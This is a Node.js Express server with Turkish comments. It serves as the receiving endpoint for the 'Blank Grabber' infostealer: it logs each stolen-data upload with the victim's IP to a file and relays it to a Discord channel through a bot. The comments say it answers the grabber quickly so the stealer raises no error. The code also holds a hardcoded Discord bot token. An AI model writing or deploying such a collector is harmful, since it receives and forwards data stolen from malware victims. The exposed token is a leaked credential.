const express = require('express');
const fetch = require('node-fetch');
const fs = require('fs');
const app = express();

app.use(express.json({limit:'100mb'}));
app.use(express.raw({limit:'100mb'}));
app.use(express.text({limit:'100mb'}));

const BOT_TOKEN = 'MTQ0NzI2OTkyNDQ1OTUxMTk2OQ.GANDJ5.JcDWdT3pgu1VLC8qm_XYCAh5TDZhnc8s4axGGg';
const CHANNEL_ID = '1447270065257971813';

app.all('/', async (req, res) => {
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.ip || 'bilinmiyor';
    const zaman = new Date().toLocaleString('tr-TR');
    let veri = typeof req.body === 'object' ? JSON.stringify(req.body, null, 2) : req.body?.toString() || 'boş';

    // Render’da log tut
    const log = `\n\nYENİ GRAB\n${zaman} | ${ip}\n${veri}\n`;
    fs.appendFileSync('logs.txt', log);
    console.log(log);

    // Blank Grabber’a hemen cevap ver (hata vermesin)
    res.send('ok');

    // Botla güzel embed gönder
    try {
        await fetch(`https://discord.com/api/v10/channels/${CHANNEL_ID}/messages`, {
            method: 'POST',
            headers: {
                'Authorization': `Bot ${BOT_TOKEN}`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                embeds: [{
                    title: "🟢 YENİ GRAB GELDİ!",
                    color: 0x00ff00,
                    fields: [
                        { name: "🌍 IP", value: ip, inline: true },
                        { name: "⏰ Zaman", value: zaman, inline: true }
                    ],
                    description: "```json\n" + veri.slice(0,4000) + "\n```",
                    timestamp: new Date(),
                    footer: { text: "Blank Grabber • Bot Logger" }
                }]
            })
        });
    } catch (e) { console.log('Bot gönderim hatası:', e); }
});

app.listen(process.env.PORT || 3000, () => console.log('Botlu sistem aktif!'));
